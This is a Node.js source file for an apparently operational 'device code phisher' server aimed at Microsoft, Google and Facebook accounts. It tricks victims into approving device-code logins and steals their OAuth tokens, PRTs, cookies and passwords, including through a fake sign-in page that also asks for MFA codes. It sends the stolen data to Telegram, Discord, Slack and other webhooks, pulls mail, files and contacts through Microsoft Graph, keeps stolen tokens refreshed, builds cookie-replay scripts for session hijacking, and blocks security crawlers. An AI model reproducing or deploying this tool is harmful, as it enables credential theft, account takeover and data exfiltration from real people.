// ============================================================
// 🥔 ULTIMATE DEVICE CODE PHISHER v3.3 – CSP & 404 Fixes
// ============================================================
// Now includes proper Content-Security-Policy headers and a
// clean 404 handler to stop browser extension noise.
// ============================================================

const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const url = require('url');
const zlib = require('zlib');
const axios = require('axios');
const FormData = require('form-data');
const WebSocket = require('ws');
const QRCode = require('qrcode');
const express = require('express');
const basicAuth = require('express-basic-auth');
const AdmZip = require('adm-zip');

// ── Environment ──
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK || '';
const SLACK_WEBHOOK = process.env.SLACK_WEBHOOK || '';
const DINGTALK_WEBHOOK = process.env.DINGTALK_WEBHOOK || '';
const MATTERMOST_WEBHOOK = process.env.MATTERMOST_WEBHOOK || '';
const GENERIC_WEBHOOK = process.env.GENERIC_WEBHOOK || '';
const SMTP_HOST = process.env.SMTP_HOST || '';
const SMTP_PORT = process.env.SMTP_PORT || 587;
const SMTP_USER = process.env.SMTP_USER || '';
const SMTP_PASS = process.env.SMTP_PASS || '';
const DASHBOARD_USER = process.env.DASHBOARD_USER || 'admin';
const DASHBOARD_PASS = process.env.DASHBOARD_PASS || 'password';
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://login.microsoftonline.com';
const CLIENT_ID = process.env.CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
const SCOPE = 'https://graph.microsoft.com/.default offline_access';
const SESSION_TTL = process.env.SESSION_TTL ? parseInt(process.env.SESSION_TTL) : 7 * 24 * 60 * 60 * 1000; // 7 days

// ── Storage ──
const FLOWS_FILE = path.join(__dirname, 'device_flows.json');
const LOGS_DIR = path.join(__dirname, 'logs');
if (!fs.existsSync(LOGS_DIR)) fs.mkdirSync(LOGS_DIR);

let flows = [];
loadFlows();

function loadFlows() {
    try {
        if (fs.existsSync(FLOWS_FILE)) {
            flows = JSON.parse(fs.readFileSync(FLOWS_FILE, 'utf-8'));
        }
    } catch (e) { console.warn('Could not load flows:', e.message); }
}
function saveFlows() {
    fs.writeFileSync(FLOWS_FILE, JSON.stringify(flows, null, 2));
}

// ── Session Cleanup ──
function cleanupSessions() {
    const now = Date.now();
    const before = flows.length;
    flows = flows.filter(f => (now - new Date(f.created).getTime()) < SESSION_TTL);
    if (flows.length !== before) {
        saveFlows();
        console.log(`🧹 Cleaned ${before - flows.length} expired sessions.`);
    }
}
setInterval(cleanupSessions, 60 * 60 * 1000); // hourly

// ── Helpers ──
function generateSessionId() {
    return crypto.randomBytes(16).toString('hex');
}

function isBot(userAgent) {
    if (!userAgent) return true;
    const ua = userAgent.toLowerCase();
    const bots = ['bot','crawler','spider','scraper','curl','wget','python','go-http','java','http-client'];
    return bots.some(b => ua.includes(b));
}

// ── Rate Limiter ──
const ipRequests = new Map();
function rateLimit(ip) {
    const now = Date.now();
    const window = 60000; // 1 minute
    const max = 30;
    if (!ipRequests.has(ip)) {
        ipRequests.set(ip, { count: 1, reset: now + window });
        return true;
    }
    const entry = ipRequests.get(ip);
    if (now > entry.reset) {
        entry.count = 1;
        entry.reset = now + window;
        return true;
    }
    if (entry.count < max) {
        entry.count++;
        return true;
    }
    return false;
}

// ── IP Geolocation ──
const geoCache = new Map();
async function getGeo(ip) {
    if (ip === '127.0.0.1' || ip === '::1' || !ip) return { country: 'XX', flag: '🌍', name: 'Local' };
    if (geoCache.has(ip)) return geoCache.get(ip);
    try {
        const resp = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 });
        const data = resp.data;
        if (data.country_code) {
            const flag = String.fromCodePoint(...[...data.country_code].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
            const result = { country: data.country_code, flag, name: data.country_name || data.country_code };
            geoCache.set(ip, result);
            return result;
        }
    } catch (e) {}
    const fallback = { country: 'UN', flag: '🌍', name: 'Unknown' };
    geoCache.set(ip, fallback);
    return fallback;
}

// ── Multi‑Channel Exfil (for credentials) ──
async function exfiltrate(data) {
    const { email, tokens, sessionId, ip, userAgent, tenantId, prt, cookies, fingerprint } = data;
    const geo = await getGeo(ip);
    let message = `🔐 **Device Code Capture!**\n\n`;
    message += `🆔 Session: ${sessionId}\n`;
    message += `👤 Email: ${email || 'Unknown'}\n`;
    message += `🏢 Tenant: ${tenantId || 'N/A'}\n`;
    message += `🌍 IP: ${ip} (${geo.flag} ${geo.country} - ${geo.name})\n`;
    message += `🖥️ UA: ${userAgent || 'N/A'}\n`;
    message += `📱 Fingerprint: ${fingerprint || 'N/A'}\n`;
    message += `🕒 Time: ${new Date().toISOString()}\n\n`;
    if (tokens.access_token) message += `🔑 Access: ${tokens.access_token.slice(0,30)}...\n`;
    if (tokens.refresh_token) message += `🔄 Refresh: ${tokens.refresh_token.slice(0,30)}...\n`;
    if (tokens.id_token) message += `🆔 ID: ${tokens.id_token.slice(0,30)}...\n`;
    if (prt) message += `🟣 PRT: ${prt.slice(0,30)}...\n`;
    if (cookies && cookies.length) message += `🍪 Cookies: ${cookies.length} captured\n`;

    // Send to all configured channels
    const webhooks = [
        { url: BOT_TOKEN && CHAT_ID ? `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` : null, method: 'post', payload: { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown', disable_web_page_preview: true } },
        { url: DISCORD_WEBHOOK, method: 'post', payload: { content: message.substring(0, 2000) } },
        { url: SLACK_WEBHOOK, method: 'post', payload: { text: message } },
        { url: DINGTALK_WEBHOOK, method: 'post', payload: { msgtype: 'text', text: { content: message } } },
        { url: MATTERMOST_WEBHOOK, method: 'post', payload: { text: message } },
        { url: GENERIC_WEBHOOK, method: 'post', payload: { text: message } }
    ];

    for (const hook of webhooks) {
        if (hook.url) {
            try {
                await axios[hook.method](hook.url, hook.payload, { timeout: 5000 });
            } catch (e) { /* silent */ }
        }
    }

    // Telegram file attachment (if tokens)
    if (BOT_TOKEN && CHAT_ID && (tokens.access_token || tokens.refresh_token || tokens.id_token || prt)) {
        try {
            let fileText = `# Tokens\nSession: ${sessionId}\nEmail: ${email || 'N/A'}\n\n`;
            if (tokens.access_token) fileText += `ACCESS_TOKEN:\n${tokens.access_token}\n\n`;
            if (tokens.refresh_token) fileText += `REFRESH_TOKEN:\n${tokens.refresh_token}\n\n`;
            if (tokens.id_token) fileText += `ID_TOKEN:\n${tokens.id_token}\n\n`;
            if (prt) fileText += `PRT:\n${prt}\n\n`;
            if (cookies && cookies.length) fileText += `COOKIES:\n${cookies.join('\n')}\n\n`;
            const tmpFile = path.join(__dirname, `tokens_${sessionId}.txt`);
            fs.writeFileSync(tmpFile, fileText);
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('document', fs.createReadStream(tmpFile), { filename: `tokens_${sessionId}.txt` });
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
                headers: form.getHeaders(),
                timeout: 10000
            });
            fs.unlinkSync(tmpFile);
        } catch (e) { console.warn('Telegram file exfil failed:', e.message); }
    }

    console.log(`✅ Exfiltrated session ${sessionId}`);
}

// ── Visit Notification (just a visit, no tokens) ──
async function sendVisitNotification(sessionId, ip, userAgent, referer) {
    if (!BOT_TOKEN || !CHAT_ID) {
        console.warn('⚠️ Telegram credentials missing – visit notification skipped.');
        return;
    }
    const geo = await getGeo(ip);
    const message = `🌐 **New Device Page Visit!**\n\n🆔 Session: ${sessionId}\n🌍 IP: ${ip} (${geo.flag} ${geo.country} - ${geo.name})\n🖥️ UA: ${userAgent || 'N/A'}\n🔗 Referer: ${referer || 'Direct'}\n🕒 Time: ${new Date().toISOString()}`;
    try {
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        }, { timeout: 5000 });
        console.log(`✅ Visit notification sent for session ${sessionId}`);
    } catch (e) {
        console.warn('Visit notification failed:', e.message);
    }
}

// ── Graph API Deep Exfil ──
async function exfilGraphData(accessToken, sessionId) {
    const endpoints = {
        emails: '/me/messages?$top=20&$select=subject,from,receivedDateTime',
        files: '/me/drive/root/children?$top=10&$select=name,size,webUrl',
        calendar: '/me/calendar/events?$top=10&$select=subject,start,end',
        contacts: '/me/contacts?$top=10&$select=displayName,emailAddresses'
    };
    const results = {};
    for (const [key, endpoint] of Object.entries(endpoints)) {
        try {
            const resp = await axios.get(`https://graph.microsoft.com/v1.0${endpoint}`, {
                headers: { Authorization: `Bearer ${accessToken}` },
                timeout: 10000
            });
            results[key] = resp.data.value || [];
        } catch (e) { results[key] = []; }
    }

    // Create a ZIP file with all data
    const zip = new AdmZip();
    for (const [key, items] of Object.entries(results)) {
        if (items.length) {
            let txt = `# ${key.toUpperCase()} - Session ${sessionId}\n\n`;
            items.forEach((item, i) => {
                txt += `--- ${key} ${i+1} ---\n`;
                txt += JSON.stringify(item, null, 2) + '\n\n';
            });
            zip.addFile(`${key}.txt`, Buffer.from(txt));
        }
    }
    if (zip.getEntries().length === 0) return;

    const zipPath = path.join(__dirname, `graph_${sessionId}.zip`);
    zip.writeZip(zipPath);

    // Send via Telegram (if configured)
    if (BOT_TOKEN && CHAT_ID) {
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(zipPath), { filename: `graph_${sessionId}.zip` });
        form.append('caption', `📁 Graph data for session ${sessionId}`);
        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
                headers: form.getHeaders(),
                timeout: 30000
            });
        } catch (e) { console.warn('Graph ZIP exfil failed:', e.message); }
    }
    fs.unlinkSync(zipPath);
    console.log(`📦 Graph data exfiltrated for session ${sessionId}`);
}

// ── Token Health Check ──
async function checkTokenHealth(accessToken) {
    try {
        const resp = await axios.get('https://graph.microsoft.com/v1.0/me', {
            headers: { Authorization: `Bearer ${accessToken}` },
            timeout: 5000
        });
        return { valid: true, user: resp.data.userPrincipalName };
    } catch (e) {
        return { valid: false, error: e.message };
    }
}

// ── Auto‑Refresh Daemon ──
async function refreshTokens() {
    for (const flow of flows) {
        if (flow.status === 'approved' && flow.refresh_token) {
            try {
                const tenant = flow.tenant || 'organizations';
                const resp = await axios.post(`https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
                    new URLSearchParams({
                        client_id: flow.client_id || CLIENT_ID,
                        refresh_token: flow.refresh_token,
                        grant_type: 'refresh_token',
                        scope: SCOPE
                    }),
                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
                );
                flow.access_token = resp.data.access_token;
                if (resp.data.refresh_token) flow.refresh_token = resp.data.refresh_token;
                flow.last_refresh = new Date().toISOString();
                saveFlows();
                console.log(`🔄 Refreshed tokens for session ${flow.session_id}`);
            } catch (e) {
                console.warn(`Refresh failed for ${flow.session_id}:`, e.message);
            }
        }
    }
}
setInterval(refreshTokens, 60 * 60 * 1000); // every hour

// ── Express App ──
const app = express();
app.use(express.json());
app.use(express.static('public'));

// 🔥 NEW: Content-Security-Policy Header to fix favicon and asset loading
app.use((req, res, next) => {
    res.setHeader("Content-Security-Policy", "default-src 'self'; img-src 'self' data:; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' wss:;");
    next();
});

// Health
app.get(['/', '/health'], (req, res) => {
    res.json({ status: 'healthy', timestamp: new Date().toISOString() });
});

// Rate limiting middleware
app.use((req, res, next) => {
    const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
    if (!rateLimit(ip)) {
        return res.status(429).send('Too Many Requests');
    }
    if (isBot(req.headers['user-agent']) && req.path.startsWith('/device')) {
        return res.status(403).send('Forbidden');
    }
    next();
});

// ── Serve custom device page from /device ──
app.get('/device', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'device_code.html'));
});

// ── Device Code Flow ──
app.post('/device/request', async (req, res) => {
    try {
        const service = req.query.service || 'microsoft';
        let clientId = CLIENT_ID;
        let scope = SCOPE;
        let endpoint = 'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode';
        if (service === 'google') {
            clientId = process.env.GOOGLE_CLIENT_ID || '';
            scope = 'openid email profile';
            endpoint = 'https://accounts.google.com/o/oauth2/device/code';
        } else if (service === 'facebook') {
            clientId = process.env.FACEBOOK_CLIENT_ID || '';
            scope = 'email';
            endpoint = 'https://graph.facebook.com/v17.0/device/code';
        }
        const resp = await axios.post(endpoint,
            new URLSearchParams({ client_id: clientId, scope }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
        );
        const data = resp.data;
        const flow = {
            device_code: data.device_code,
            user_code: data.user_code,
            verification_uri: data.verification_uri,
            expires_in: data.expires_in,
            interval: data.interval,
            status: 'pending',
            created: new Date().toISOString(),
            client_id: clientId,
            session_id: generateSessionId(),
            service: service,
            tenant: 'organizations',
            cookies: [],
            fingerprint: null,
            visit_notified: false  // flag to avoid duplicate visit alerts
        };
        flows.push(flow);
        saveFlows();
        // Return session_id along with device data
        res.json({
            ...data,
            session_id: flow.session_id
        });
    } catch (error) {
        console.error('Device request error:', error.response?.data || error.message);
        res.status(500).json({ error: 'server_error', error_description: error.response?.data?.error_description || error.message });
    }
});

// ── Visit Notification Endpoint ──
app.post('/device/visit', async (req, res) => {
    const { sessionId } = req.body;
    if (!sessionId) return res.status(400).json({ error: 'sessionId required' });
    const flow = flows.find(f => f.session_id === sessionId);
    if (!flow) return res.status(404).json({ error: 'session not found' });
    // Prevent duplicate notifications
    if (flow.visit_notified) {
        return res.json({ success: true, already: true });
    }
    flow.visit_notified = true;
    saveFlows();

    const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const referer = req.headers['referer'] || req.headers['referrer'] || 'Direct';

    // Send notification
    await sendVisitNotification(sessionId, ip, userAgent, referer);
    res.json({ success: true });
});

// ── Device Token Endpoint ──
app.post('/device/token', async (req, res) => {
    const { device_code } = req.body;
    if (!device_code) return res.status(400).json({ error: 'invalid_request', error_description: 'device_code required' });
    const flow = flows.find(f => f.device_code === device_code);
    if (!flow) return res.status(404).json({ error: 'not_found' });
    try {
        const tenant = flow.tenant || 'organizations';
        const endpoint = flow.service === 'google' ? 'https://oauth2.googleapis.com/token' :
                         flow.service === 'facebook' ? 'https://graph.facebook.com/v17.0/oauth/access_token' :
                         `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`;
        const resp = await axios.post(endpoint,
            new URLSearchParams({
                client_id: flow.client_id,
                device_code: device_code,
                grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
        );
        const tokens = resp.data;
        let email = 'Unknown';
        let tenantId = null;
        let prt = null;
        if (tokens.id_token) {
            try {
                const parts = tokens.id_token.split('.');
                const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
                email = payload.email || payload.preferred_username || payload.upn || email;
                tenantId = payload.tid || payload.tenantId || null;
                if (payload.prt) prt = payload.prt;
            } catch (e) {}
        }
        if (tokens.prt) prt = tokens.prt;

        flow.status = 'approved';
        flow.access_token = tokens.access_token;
        flow.refresh_token = tokens.refresh_token;
        flow.id_token = tokens.id_token;
        flow.prt = prt;
        flow.approved = new Date().toISOString();
        flow.username = email;
        if (tenantId) flow.tenant = tenantId;
        saveFlows();

        // Exfiltrate
        const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
        await exfiltrate({
            sessionId: flow.session_id,
            email,
            tokens: { access_token: tokens.access_token, refresh_token: tokens.refresh_token, id_token: tokens.id_token },
            prt,
            ip,
            userAgent: req.headers['user-agent'],
            tenantId,
            cookies: flow.cookies || [],
            fingerprint: flow.fingerprint
        });

        // Trigger Graph exfil if access token available
        if (tokens.access_token) {
            setTimeout(() => exfilGraphData(tokens.access_token, flow.session_id), 15000);
        }

        // Broadcast via WebSocket
        broadcast({ type: 'new_capture', session: flow.session_id, email, timestamp: new Date().toISOString() });

        res.json(tokens);
    } catch (error) {
        if (error.response?.data?.error === 'authorization_pending') {
            res.status(400).json({ error: 'authorization_pending' });
        } else if (error.response?.data?.error === 'expired_token') {
            res.status(400).json({ error: 'expired_token' });
        } else {
            console.error('Token error:', error.response?.data || error.message);
            res.status(500).json({ error: 'server_error', error_description: error.response?.data?.error_description || error.message });
        }
    }
});

// ── Fingerprint & Cookie capture ──
app.post('/device/fingerprint', (req, res) => {
    const { sessionId, fingerprint, cookies } = req.body;
    const flow = flows.find(f => f.session_id === sessionId);
    if (flow) {
        flow.fingerprint = fingerprint;
        flow.cookies = cookies || [];
        saveFlows();
        console.log(`🖐️ Fingerprint & cookies stored for ${sessionId}`);
    }
    res.json({ success: true });
});

// ── Second‑Stage Phishing (Fake Login with MFA) ──
app.get('/login', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>Sign in</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 360px; }
        h2 { text-align: center; color: #333; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        button { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
        button:hover { background: #0063b1; }
    </style>
</head>
<body>
    <div class="card">
        <h2>Sign in to your account</h2>
        <form id="loginForm">
            <input type="email" id="email" placeholder="Email or phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <input type="text" id="mfa" placeholder="Verification code (optional)">
            <button type="submit">Sign in</button>
        </form>
    </div>
    <script>
        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const mfa = document.getElementById('mfa').value;
            await fetch('/capture', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email, password, mfa })
            });
            window.location.href = '${REDIRECT_URL}';
        });
    </script>
</body>
</html>
    `);
});

app.post('/capture', async (req, res) => {
    const { email, password, mfa } = req.body;
    console.log(`📥 Second‑stage capture: ${email} / ${password} / MFA: ${mfa || 'N/A'}`);
    await exfiltrate({
        sessionId: 'second_stage',
        email,
        tokens: {},
        ip: req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress,
        userAgent: req.headers['user-agent']
    });
    res.json({ success: true });
});

// ── Dashboard (protected) ──
app.use('/dash', basicAuth({
    users: { [DASHBOARD_USER]: DASHBOARD_PASS },
    challenge: true
}));
// Static HTML served from public/index.html

// ── API endpoints ──
app.get('/api/flows', (req, res) => {
    res.json(flows);
});

app.get('/api/flow/:sessionId', (req, res) => {
    const flow = flows.find(f => f.session_id === req.params.sessionId);
    if (!flow) return res.status(404).json({ error: 'not found' });
    res.json(flow);
});

// Manual token exchange
app.post('/api/exchange/:sessionId', async (req, res) => {
    const flow = flows.find(f => f.session_id === req.params.sessionId);
    if (!flow) return res.status(404).json({ error: 'not found' });
    if (!flow.refresh_token) return res.status(400).json({ error: 'no refresh token' });
    try {
        const tenant = flow.tenant || 'organizations';
        const resp = await axios.post(`https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
            new URLSearchParams({
                client_id: flow.client_id || CLIENT_ID,
                refresh_token: flow.refresh_token,
                grant_type: 'refresh_token',
                scope: SCOPE
            }),
            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
        );
        flow.access_token = resp.data.access_token;
        if (resp.data.refresh_token) flow.refresh_token = resp.data.refresh_token;
        flow.last_refresh = new Date().toISOString();
        saveFlows();
        res.json({ success: true, new_access_token: flow.access_token });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

// Export all as ZIP
app.get('/api/export', (req, res) => {
    const zip = new AdmZip();
    // Add flows JSON
    zip.addFile('flows.json', Buffer.from(JSON.stringify(flows, null, 2)));
    // Add each session's tokens as a separate file
    flows.forEach(f => {
        if (f.access_token || f.refresh_token || f.id_token || f.prt) {
            let txt = `Session: ${f.session_id}\nEmail: ${f.username || 'Unknown'}\nCreated: ${f.created}\n\n`;
            if (f.access_token) txt += `ACCESS_TOKEN:\n${f.access_token}\n\n`;
            if (f.refresh_token) txt += `REFRESH_TOKEN:\n${f.refresh_token}\n\n`;
            if (f.id_token) txt += `ID_TOKEN:\n${f.id_token}\n\n`;
            if (f.prt) txt += `PRT:\n${f.prt}\n\n`;
            if (f.cookies && f.cookies.length) txt += `COOKIES:\n${f.cookies.join('\n')}\n\n`;
            zip.addFile(`session_${f.session_id}.txt`, Buffer.from(txt));
        }
    });
    const zipBuffer = zip.toBuffer();
    res.setHeader('Content-Type', 'application/zip');
    res.setHeader('Content-Disposition', `attachment; filename=all_sessions_${Date.now()}.zip`);
    res.send(zipBuffer);
});

// Replay endpoint with cookies
app.get('/api/replay/:sessionId', (req, res) => {
    const flow = flows.find(f => f.session_id === req.params.sessionId);
    if (!flow) return res.status(404).json({ error: 'not found' });
    const cookies = flow.cookies || [];
    const token = flow.access_token || '';
    const script = `
    (function() {
        const cookies = ${JSON.stringify(cookies)};
        const token = '${token}';
        cookies.forEach(c => {
            document.cookie = c + '; path=/; domain=login.microsoftonline.com; Secure; SameSite=None';
        });
        if (token) {
            localStorage.setItem('access_token', token);
        }
        alert('Cookies and token injected. You can now login.');
        window.location.href = 'https://login.microsoftonline.com';
    })();
    `;
    res.json({ replayScript: script });
});

// ── WebSocket Server ──
const wsServer = new WebSocket.Server({ noServer: true });
const wsClients = new Set();

wsServer.on('connection', (ws) => {
    wsClients.add(ws);
    ws.on('close', () => wsClients.delete(ws));
});

function broadcast(data) {
    const msg = JSON.stringify(data);
    for (const client of wsClients) {
        if (client.readyState === WebSocket.OPEN) {
            client.send(msg);
        }
    }
}

// ── Health Check Endpoint ──
app.get('/api/health', async (req, res) => {
    const results = [];
    for (const flow of flows) {
        if (flow.access_token) {
            const health = await checkTokenHealth(flow.access_token);
            results.push({ session: flow.session_id, ...health });
        }
    }
    res.json(results);
});

// 🔥 NEW: Catch-all 404 handler to prevent "Cannot POST /..." extension errors
app.use((req, res) => {
    res.status(404).send('404 Not Found');
});

// ── Start HTTP server with WebSocket upgrade ──
const server = http.createServer(app);

server.on('upgrade', (req, socket, head) => {
    if (req.url === '/ws') {
        wsServer.handleUpgrade(req, socket, head, (ws) => {
            wsServer.emit('connection', ws, req);
        });
    } else {
        socket.destroy();
    }
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Ultimate Device Phisher v3.3 running on port ${PORT}`);
    console.log(`📱 Device page: http://localhost:${PORT}/device  (serves device_code.html)`);
    console.log(`📊 Dashboard: http://localhost:${PORT}/dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
    console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
    console.log(`🚀 All features loaded.`);
});

process.on('SIGTERM', () => { server.close(() => process.exit(0)); });
process.on('SIGINT', () => { server.close(() => process.exit(0)); });
